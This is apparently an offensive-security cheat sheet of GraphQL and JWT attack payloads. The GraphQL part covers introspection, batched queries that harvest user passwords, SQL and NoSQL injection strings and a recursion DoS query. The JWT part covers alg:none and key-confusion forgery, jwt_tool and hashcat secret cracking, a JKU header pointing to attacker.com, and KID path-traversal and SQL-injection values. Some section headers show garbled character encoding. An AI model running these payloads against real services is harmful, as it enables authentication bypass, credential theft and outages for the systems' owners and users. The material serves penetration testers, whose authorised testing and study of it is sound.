üìä GraphQL Testing

GraphQL Introspection GraphQL 
# Full introspection query
{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}

# Get all types
{__schema{types{name,kind,description}}}

# Get queries and mutations
{__schema{queryType{fields{name,description}}}}
{__schema{mutationType{fields{name,description}}}}

# Get specific type details
{__type(name:"User"){name,fields{name,type{name,kind}}}}

# Introspection with curl
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
GraphQL Attacks GraphQL 
# Query batching
[
  {"query": "{ user(id: 1) { password } }"},
  {"query": "{ user(id: 2) { password } }"}
]

# Alias-based batching
{
  u1: user(id: 1) { password }
  u2: user(id: 2) { password }
  u3: user(id: 3) { password }
}

# SQL Injection in GraphQL
{ user(id: "1' OR '1'='1") { name email } }
{ user(name: "admin'--") { id } }

# NoSQL Injection
{ user(id: {$ne: null}) { name } }

# DoS - Deep recursion
{ user { friends { friends { friends { friends { name }}}}}}

# Field suggestion exploitation
{ user { pasword } }  # Check error for suggestion

# Bypass introspection disable
# Try: __Schema, __SCHEMA, ___schema

üé´ JWT Attacks

JWT Vulnerabilities JWT 
# Decode JWT
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxx" | cut -d'.' -f2 | base64 -d

# None algorithm attack
# Header: {"alg": "none", "typ": "JWT"}
# Variations: None, NONE, nOnE

# Algorithm confusion (RS256 ‚Üí HS256)
# Get public key, use as HMAC secret

# jwt_tool commands
jwt_tool TOKEN -T                    # Tamper token
jwt_tool TOKEN -C -d wordlist.txt    # Crack secret
jwt_tool TOKEN -X a                  # Test alg:none
jwt_tool TOKEN -X k -pk pubkey.pem   # Key confusion
jwt_tool TOKEN -I -pc user -pv admin # Inject claim

# Crack with hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# JKU/X5U header injection
{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}

# KID injection
{"kid":"../../etc/passwd"}
{"kid":"key' UNION SELECT 'secret'--"}
